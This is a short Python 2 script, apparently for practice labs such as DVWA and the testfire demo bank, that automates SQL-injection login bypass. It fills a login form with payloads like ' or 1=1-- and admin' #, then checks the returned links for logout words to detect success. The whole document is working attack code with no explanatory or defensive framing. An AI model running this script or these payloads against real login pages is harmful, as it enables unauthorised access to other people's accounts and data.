import mechanize
import re


br = mechanize.Browser()
#url = 'http://s50247-102131-frh.sipontum.hack.me/index.php'
url = 'http://192.168.9.12/dvwa/vulnerabilities/sqli/'
#url = 'http://demo.testfire.net/bank/login.aspx'
br.set_handle_equiv(True)
br.set_handle_gzip(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(True)
br.open(url)



for form in br.forms():
	print form
#form = raw_input("Enter the form name " )
#form = br.form = list(br.forms())[0]

form = "login"
br.select_form(name =form)
user_exp = ["' or 1=1-- ", "' or 1=1#", "admin' #" ]
#user1 = raw_input("Enter the Username ")
#pass1 = raw_input("Enter the Password ")
user1 = "uid"
pass1 = "passw"
#form = br.form = list(br.forms())[0]


flag =0
p =0
while flag ==0:
	br.select_form(name =form)
	br.form[user1] = user_exp[p]
	br.form[pass1] = "aaaaaaaa"
	br.submit()
 	data = ""
 	for link in br.links():
		data=data+str(link)
	list = ['logout','logoff', 'signout','signoff']
	data1 = data.lower()
	for l in list:
 		for match in re.findall(l,data1):
			flag = 1
		if flag ==1:
			print "\t Success in ",p+1," attempts"
			print "Successfull hit --> ",user_exp[p]
		elif(p+1 == len(user_exp)):
			print "All exploits over "
			flag =1
	else :
		p = p+1